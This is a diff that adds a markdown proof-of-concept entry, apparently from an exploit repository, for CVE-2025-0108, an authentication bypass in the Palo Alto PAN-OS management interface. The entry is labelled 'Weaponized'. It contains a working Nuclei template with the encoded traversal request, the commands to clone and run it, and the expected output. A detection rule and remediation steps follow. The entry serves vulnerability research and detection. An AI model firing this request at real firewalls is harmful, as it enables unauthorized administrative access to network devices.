@@ -1,0 +1,153 @@
+
+<!-- 
+  File: 2026-05-16_pan-os-management-auth-bypass.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-16 |
+| **Author / Researcher** | FOLKS-iwd |
+| **CVE / Advisory** | CVE-2025-0108 |
+| **Category** | web |
+| **Severity** | Critical |
+| **CVSS Score** | 9.1 (CVSSv3) |
+| **Status** | Weaponized |
+| **Tags** | auth-bypass, path-traversal, PAN-OS, Palo Alto, management-interface, unauthenticated |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Palo Alto Networks PAN-OS management web interface |
+| **Versions Affected** | PAN-OS versions impacted by CVE-2025-0108 (see vendor advisory for exact fixed builds) |
+| **Language / Platform** | PAN-OS web management plane (HTTP/HTTPS interface) |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2025-0108 is an authentication bypass in the PAN-OS management interface that can allow unauthorized administrative access. The PoC uses a crafted path traversal style request to reach sensitive management functionality without a valid login session. Public reporting indicates active exploitation in early 2025, and defenders frequently track this issue as part of chained PAN-OS compromise activity.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+The vulnerable request handling path does not correctly enforce authentication checks when specific crafted management-interface paths are requested. Path traversal style encoding can route traffic into privileged handlers that are expected to be reachable only after successful authentication.
+
+### Attack Vector
+
+A remote attacker with network reachability to the PAN-OS management interface sends crafted unauthenticated HTTP requests to vulnerable endpoints. The included PoC template checks for this condition using an encoded traversal path that returns management content when bypass is successful.
+
+### Impact
+
+Successful exploitation can provide unauthorized access to management-plane functionality. In real-world attack chains, this can enable follow-on actions such as configuration tampering, credential abuse, and broader device compromise.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux/macOS/Windows attacker host
+Target:      PAN-OS firewall exposing management interface (authorized lab only)
+Attacker:    Security testing workstation
+Tools:       Nuclei, curl
+```
+
+### Setup Steps
+
+```bash
+git clone https://github.com/FOLKS-iwd/CVE-2025-0108-PoC
+cd CVE-2025-0108-PoC
+
+nuclei -t CVE-2025-0108.yaml -u https://<target-management-host>
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Confirm authorized test scope** and identify a PAN-OS management interface target.
+2. **Execute the Nuclei template** against the target using the included `CVE-2025-0108.yaml` file.
+3. **Review matched responses** for indicators that an unauthenticated crafted request reached management content.
+
+### Exploit Code
+
+> See `CVE-2025-0108.yaml` in this folder.
+
+```yaml
+id: CVE-2025-0108
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"
+```
+
+### Expected Output
+
+```
+[INF] Loaded template CVE-2025-0108
+[CVE-2025-0108] [http] [high] https://<target-management-host>/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` — add authorized captures of template execution and response evidence
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> $HOME_NET any (
+  msg:"Possible PAN-OS CVE-2025-0108 authentication bypass probe";
+  content:"/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css"; http_uri;
+  sid:95250108; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Apply Palo Alto Networks security updates that remediate CVE-2025-0108 |
+| **Workaround** | Restrict management interface access to trusted admin networks and VPN-only entry points |
+| **Config Hardening** | Disable direct internet exposure of management interfaces and monitor for traversal-pattern probes |
+
+---
+
+## References
+
+- [CVE-2025-0108 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-0108)
+- [Palo Alto Networks Security Advisory — CVE-2025-0108](https://security.paloaltonetworks.com/CVE-2025-0108)
+- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
+- [Source Repository — FOLKS-iwd/CVE-2025-0108-PoC](https://github.com/FOLKS-iwd/CVE-2025-0108-PoC)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/FOLKS-iwd/CVE-2025-0108-PoC on 2026-05-16.
+
